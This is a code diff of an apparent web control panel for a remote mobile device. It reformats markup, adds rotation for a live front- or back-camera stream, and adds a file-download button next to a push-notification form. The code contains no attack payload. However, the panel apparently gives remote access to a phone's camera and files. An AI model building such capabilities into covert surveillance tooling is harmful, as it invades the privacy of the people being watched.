@@ -410,7 +410,8 @@
                 <div class="flex items-center justify-between mb-3">
                     <p class="text-sm font-black text-white">Live Stream (MJPEG)</p>
                     <div class="flex gap-1.5">
-                        <select x-model="streamFacing" :disabled="streaming" class="bg-[#0a0f1c] text-[10px] font-bold text-slate-400 border border-slate-800 rounded-md px-2 outline-none">
+                        <select x-model="streamFacing" :disabled="streaming"
+                            class="bg-[#0a0f1c] text-[10px] font-bold text-slate-400 border border-slate-800 rounded-md px-2 outline-none">
                             <option value="back">Back Cam</option>
                             <option value="front">Front Cam</option>
                         </select>
@@ -420,9 +421,11 @@
                         </button>
                     </div>
                 </div>
-                <div class="rounded-xl overflow-hidden"
-                    style="background:#000;border:1px solid #1a2535;min-height:180px">
-                    <img x-show="streaming" :src="streamSrc" class="w-full" @error="streaming=false">
+                <div class="rounded-xl overflow-hidden flex items-center justify-center"
+                    style="background:#000;border:1px solid #1a2535;min-height:240px">
+                    <img x-show="streaming" :src="streamSrc" class="max-w-full max-h-full"
+                        :style="'transform: rotate(' + (streamFacing === \'front\' ? ( (deviceInfo.front_rot || 270) ) : (deviceInfo.back_rot || 90) ) + 'deg)'"
+                        @error="streaming=false">
                     <div x-show="!streaming" class="h-44 flex flex-col items-center justify-center gap-2">
                         <svg class="w-8 h-8 text-slate-700" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
@@ -494,10 +497,13 @@
             <div class="card-sm p-3 mb-3">
                 <p class="text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-2">Push Notification</p>
                 <div class="space-y-2">
-                    <input type="text" x-model="notifyTitle" placeholder="Judul Notifikasi" class="input-field text-sm py-2">
+                    <input type="text" x-model="notifyTitle" placeholder="Judul Notifikasi"
+                        class="input-field text-sm py-2">
                     <div class="flex gap-2">
-                        <input type="text" x-model="notifyText" placeholder="Isi pesan..." class="input-field text-sm py-2">
-                        <button @click="exec('notify', notifyTitle + '|' + notifyText)" class="btn-primary px-4 py-2 shrink-0">Push</button>
+                        <input type="text" x-model="notifyText" placeholder="Isi pesan..."
+                            class="input-field text-sm py-2">
+                        <button @click="exec('notify', notifyTitle + '|' + notifyText)"
+                            class="btn-primary px-4 py-2 shrink-0">Push</button>
                     </div>
                 </div>
             </div>
@@ -679,6 +685,16 @@
                                 </div>
                             </div>
                             <div class="flex gap-1 ml-2 shrink-0" @click.stop>
+                                <button x-show="!file.is_dir"
+                                    @click="window.open('/api/files?path=' + encodeURIComponent(file.path) + '&dl=1')"
+                                    class="w-8 h-8 rounded-lg flex items-center justify-center"
+                                    style="background:#052e16">
+                                    <svg class="w-3.5 h-3.5 text-emerald-400" fill="none" stroke="currentColor"
+                                        viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                            d="M4 16v1a2 2 0 002 2h12a2 2 0 002-2v-1M7 9l5 5 5-5m-5-5v10" />
+                                    </svg>
+                                </button>
                                 <button @click="renameFile(file)"
                                     class="w-8 h-8 rounded-lg flex items-center justify-center"
                                     style="background:#1a2535">
